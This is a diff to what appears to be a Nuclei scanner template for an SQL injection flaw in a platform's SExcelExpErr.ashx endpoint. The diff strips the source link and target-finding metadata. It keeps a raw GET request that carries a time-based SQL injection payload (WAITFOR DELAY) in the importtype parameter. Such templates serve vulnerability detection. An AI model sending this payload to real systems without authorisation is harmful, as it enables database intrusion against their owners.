@@ -3,19 +3,13 @@ info:
   name: 智慧平台SExcelExpErr存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/glqf3vow28x6g3pa'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: glqf3vow28x6g3pa
-    fofa: body="custom/blue/uimaker/easyui.css"
 http:
 - raw:
   - 'GET /ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351521867-38ce24e4-12ec-4055-9109-c47c7470b1f6.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
